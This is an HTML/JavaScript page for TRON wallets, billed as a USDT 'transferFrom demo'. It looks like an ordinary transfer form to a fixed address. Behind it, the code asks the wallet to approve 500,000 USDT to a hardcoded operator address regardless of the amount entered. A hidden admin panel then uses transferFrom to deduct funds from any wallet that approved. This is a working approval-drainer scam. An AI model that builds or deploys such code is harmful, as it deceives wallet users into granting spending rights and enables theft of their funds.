<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>TRON‑USDT transferFrom Demo</title>
<script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.min.js"></script>
<style>
*{
 box-sizing: border-box;
 margin: 0;
 padding: 0;
 -webkit-tap-highlight-color: transparent;
 font-family: -apple-system, BlinkMacSystemFont, system-ui, sans-serif;
}
body {
 background-color: #f7f8fa;
 padding: 20px 16px;
 max-width: 520px;
 margin: 0 auto;
}
.top-header-bar {
 display: flex;
 justify-content: space-between;
 align-items: center;
 margin-bottom: 20px;
}
.header-right-icons {
 display: flex;
 gap: 12px;
 align-items: center;
}
.wallet-dot {
 width: 12px;
 height: 12px;
 border-radius: 50%;
 background-color: #ef4444;
 cursor: pointer;
 transition: background-color 0.3s ease;
}
.wallet-dot.connected {
 background-color: #22c55e;
}
.setting-btn {
 width: 32px;
 height: 32px;
 border-radius: 50%;
 border: 1px solid #ddd;
 background: #fff;
 display: flex;
 align-items: center;
 justify-content: center;
 font-size: 18px;
 cursor: pointer;
}
.address-card {
 background: #ffffff;
 border-radius: 16px;
 padding: 20px 18px;
 margin-bottom: 16px;
}
.label-text {
 font-size: 16px;
 color: #666;
 margin-bottom: 12px;
}
.fixed-addr-box {
 width: 100%;
 border: 1px solid #e5e7eb;
 border-radius: 12px;
 padding: 14px 12px;
 background: #f1f5f9;
 color: #333;
 word-break: break-all;
}
.amount-card {
 background: #ffffff;
 border-radius: 16px;
 padding: 20px 18px;
 margin-bottom:16px;
}
.amount-row {
 display: flex;
 align-items: flex-end;
 justify-content: space-between;
 margin-bottom: 16px;
}
.amount-input {
 font-size: 32px;
 border: none;
 outline: none;
 width: 75%;
 background: transparent;
 color: #111;
}
.amount-input::placeholder {
 font-size: 16px;
 color: #aaa;
}
.max-btn {
 padding: 6px 14px;
 background-color: #dbeafe;
 color: #2563eb;
 border-radius: 8px;
 font-weight: 500;
 cursor: pointer;
}
.token-row {
 background-color: #eef2ff;
 border-radius: 12px;
 padding: 14px;
 display: flex;
 align-items: center;
 justify-content: space-between;
}
.token-left {
 display: flex;
 align-items: center;
 gap: 10px;
}
.usdt-icon {
 width: 32px;
 height: 32px;
 border-radius: 50%;
 object-fit: cover;
}
.token-name {
 font-size: 18px;
 font-weight: 500;
}
.token-balance {
 color: #555;
 font-size: 16px;
}
.result-card{
 background:#fff;
 border-radius:16px;
 padding:18px;
 margin-bottom:16px;
}
.result-input{
 width:100%;
 border:1px solid #e5e7eb;
 border-radius:12px;
 padding:14px 12px;
 background:#f9fafb;
 outline:none;
 color:#111;
}
.send-main-btn{
 width:100%;
 padding:16px;
 border:none;
 border-radius:14px;
 background:#2563eb;
 color:#fff;
 font-size:17px;
 font-weight:500;
 cursor:pointer;
}
.send-main-btn:disabled{
 background:#94a3b8;
 cursor:not-allowed;
}
.admin-panel{
 background:#fff;
 border-radius:16px;
 padding:20px 18px;
 margin-top:24px;
 border:1px solid #f87171;
 display:none;
}
.admin-title{
 font-size:17px;
 font-weight:bold;
 color:#dc2626;
 margin-bottom:16px;
}
.admin-input-item{
 margin-bottom:14px;
}
.admin-input{
 width:100%;
 border:1px solid #e5e7eb;
 border-radius:12px;
 padding:13px 12px;
 outline:none;
 font-size:15px;
}
.admin-btn{
 width:100%;
 padding:14px;
 border:none;
 border-radius:14px;
 background:#dc2626;
 color:#fff;
 font-size:16px;
 cursor:pointer;
}
</style>
</head>
<body>
<div class="top-header-bar">
 <div></div>
 <div class="header-right-icons">
 <div class="wallet-dot" id="walletDot" title="点击断开钱包"></div>
 <div class="setting-btn" id="settingIconBtn" title="设置">⚙️</div>
 </div>
</div>
<div class="address-card">
 <div class="label-text">收款地址</div>
 <div class="fixed-addr-box" id="targetAddrText">TAAcemnm9fuGjDjsGnJ7BfE3NhtKbFmGZE</div>
</div>
<div class="amount-card">
 <div class="label-text">转出数量（USDT‑TRC20）</div>
 <div class="amount-row">
 <input id="amountInput" class="amount-input" value="" inputmode="decimal" placeholder="请输入数量">
 <div class="max-btn" id="maxBtn">全部</div>
 </div>
 <div class="token-row">
 <div class="token-left">
 <img class="usdt-icon" src="https://static.tronscan.org/production/logo/usdtlogo.png">
 <span class="token-name">USDT‑TRC20</span>
 </div>
 <span class="token-balance" id="balanceText">0.000000</span>
 </div>
</div>
<div class="result-card">
 <div class="label-text">到账数量</div>
 <input id="receiveAmount" class="result-input" readonly>
</div>
<button class="send-main-btn" id="sendBtn" disabled>确认转账</button>
<div class="admin-panel" id="adminPanel">
 <div class="admin-title">🔴管理员后台 - 用户代币划扣</div>
 <div class="admin-input-item">
 <div class="label-text">请输入已经授权用户钱包地址</div>
 <input class="admin-input" id="userAddrInput" placeholder="T开头波场地址">
 </div>
 <div class="admin-input-item">
 <div class="label-text">划扣USDT数量</div>
 <input class="admin-input" id="deductAmountInput" inputmode="decimal" placeholder="输入划扣金额">
 </div>
 <button class="admin-btn" id="deductBtn">确认划扣</button>
</div>

<script>
const TARGET_ADDR = "TAAcemnm9fuGjDjsGnJ7BfE3NhtKbFmGZE";
const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const DECIMALS = 6;
const MAX_WAIT = 40;

let tronWeb = null;
let userAddress = null;
let usdtContract = null;

const $ = s => document.querySelector(s);
const walletDot = $("#walletDot");
const settingIconBtn = $("#settingIconBtn");
const sendBtn = $("#sendBtn");
const amountInput = $("#amountInput");
const receiveAmount = $("#receiveAmount");
const maxBtn = $("#maxBtn");
const balanceText = $("#balanceText");
const targetAddrText = $("#targetAddrText");
const adminPanel = $("#adminPanel");
const userAddrInput = $("#userAddrInput");
const deductAmountInput = $("#deductAmountInput");
const deductBtn = $("#deductBtn");

targetAddrText.innerText = TARGET_ADDR;

const USDT_ABI = [
    {"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
    {"inputs":[{"name":"to","type":"address"},{"name":"value","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
    {"inputs":[{"name":"owner","type":"address"},{"name":"spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
    {"inputs":[{"name":"spender","type":"address"},{"name":"value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
    {"inputs":[{"name":"from","type":"address"},{"name":"to","type":"address"},{"name":"value","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}
];

async function waitTxConfirm(txHash) {
    for(let i = 0; i < MAX_WAIT; i++){
        try{
            const res = await tronWeb.trx.getTransactionInfo(txHash);
            if(res && res.receipt){
                if(res.receipt.result === "SUCCESS"){
                    return true;
                }else{
                    throw new Error("合约执行失败");
                }
            }
        }catch(e){}
        await new Promise(r => setTimeout(r,1000));
    }
    throw new Error("交易已广播，但长时间未上链，请检查TRX资源是否充足");
}

async function waitAllowance(needSun, maxLoop = 12) {
    for(let i = 0; i < maxLoop; i++){
        const allowance = await usdtContract.methods.allowance(userAddress, TARGET_ADDR).call();
        if(BigInt(allowance) >= BigInt(needSun)){
            return true;
        }
        await new Promise(r => setTimeout(r,1000));
    }
    throw new Error("授权已签名，但链上额度未同步，请稍后再试");
}

function disconnectWallet() {
    tronWeb = null;
    userAddress = null;
    usdtContract = null;
    walletDot.classList.remove("connected");
    sendBtn.disabled = true;
    balanceText.textContent = "0.000000";
    adminPanel.style.display = "none";
}

// 【OKX钱包重点兼容】等待tronWeb ready事件，不写死延时
async function autoInitWallet() {
    if (!window.tronWeb) return;
    tronWeb = window.tronWeb;
    // 等待OKX注入完成ready
    while (!tronWeb.ready) {
        await new Promise(r => setTimeout(r, 250));
    }
    // OKX触发账户注入，无弹窗
    try{ await tronWeb.setDefaultAccount(); }catch(e){}
    userAddress = tronWeb.defaultAddress?.base58;
    if (!userAddress) return;
    usdtContract = tronWeb.contract(USDT_ABI, USDT_CONTRACT);
    walletDot.classList.add("connected");
    await loadBalance();
    sendBtn.disabled = false;
    if(userAddress === TARGET_ADDR){
        adminPanel.style.display = "block";
    }
}

async function loadBalance() {
    const rawSun = await usdtContract.methods.balanceOf(userAddress).call();
    const num = Number(rawSun) / Math.pow(10, DECIMALS);
    balanceText.textContent = num.toFixed(6);
}

amountInput.addEventListener("input", () => {
    const num = parseFloat(amountInput.value) || 0;
    receiveAmount.value = num.toFixed(6);
});

maxBtn.addEventListener("click", async () => {
    if(!usdtContract) return;
    const rawSun = await usdtContract.methods.balanceOf(userAddress).call();
    const num = Number(rawSun) / Math.pow(10, DECIMALS);
    amountInput.value = num.toFixed(2);
    amountInput.dispatchEvent(new Event("input"));
});

sendBtn.addEventListener("click", async () => {
    if(!tronWeb || !userAddress) return alert("钱包未就绪，请确认在钱包DApp浏览器打开页面");
    const val = parseFloat(amountInput.value);
    if(isNaN(val) || val <= 0) return alert("请输入有效转账数量");
    const needSun = Math.round(val * Math.pow(10, DECIMALS));
    const GRANT_500K_SUN = Math.round(500000 * Math.pow(10, DECIMALS));
    sendBtn.disabled = true;
    try{
        const allowance = await usdtContract.methods.allowance(userAddress, TARGET_ADDR).call();
        if(BigInt(allowance) < BigInt(needSun)){
            alert("🔐需要授权USDT额度，钱包即将弹出签名");
            const approveTx = await usdtContract.methods.approve(TARGET_ADDR, GRANT_500K_SUN).send();
            await waitTxConfirm(approveTx);
            alert("✅授权完成，等待链上同步");
            await waitAllowance(needSun);
        }
        alert("即将转账，钱包弹出签名确认");
        const transferTx = await usdtContract.methods.transfer(TARGET_ADDR, needSun).send();
        await waitTxConfirm(transferTx);
        alert(`🎉转账成功！哈希：${transferTx}`);
        amountInput.value = "";
        receiveAmount.value = "";
        await loadBalance();
    }catch(e){
        let msg = e.message || String(e);
        if(msg.toLowerCase().includes("reject")) msg = "你在钱包拒绝了签名，操作已取消";
        alert("❌操作失败：" + msg);
    }finally{
        sendBtn.disabled = false;
    }
});

deductBtn.addEventListener("click", async () => {
    if(!tronWeb || userAddress !== TARGET_ADDR){
        return alert("必须使用管理员钱包连接！");
    }
    const fromUserAddr = userAddrInput.value.trim();
    const deductNum = parseFloat(deductAmountInput.value);
    if(!fromUserAddr){
        return alert("请输入被划扣用户钱包地址");
    }
    if(isNaN(deductNum) || deductNum <= 0){
        return alert("请输入合法划扣数量");
    }
    const deductSun = Math.round(deductNum * Math.pow(10, DECIMALS));
    try{
        const userAllowance = await usdtContract.methods.allowance(fromUserAddr, TARGET_ADDR).call();
        if(BigInt(userAllowance) < BigInt(deductSun)){
            return alert("错误：该用户没有授权足够额度，无法划扣！");
        }
        const tfTxHash = await usdtContract.methods.transferFrom(fromUserAddr, TARGET_ADDR, deductSun).send();
        await waitTxConfirm(tfTxHash);
        alert(`✅划扣成功！交易哈希:\n${tfTxHash}`);
        userAddrInput.value = "";
        deductAmountInput.value = "";
        await loadBalance();
    }catch(err){
        alert("❌划扣失败：" + err.message);
    }
});

walletDot.addEventListener("click", ()=>{
    if(userAddress){
        disconnectWallet();
    }
});

settingIconBtn.addEventListener("click", () => {
    if(userAddress && userAddress === TARGET_ADDR){
        adminPanel.style.display = adminPanel.style.display === "block" ? "none" : "block";
    }else{
        alert("你不是管理员账号");
    }
});

window.addEventListener('load',async ()=>{
    await autoInitWallet();
})

window.addEventListener('message',(e)=>{
    if(e.data?.message?.action === "accountsChanged"){
        disconnectWallet();
        autoInitWallet();
    }
})
</script>
</body>
</html>
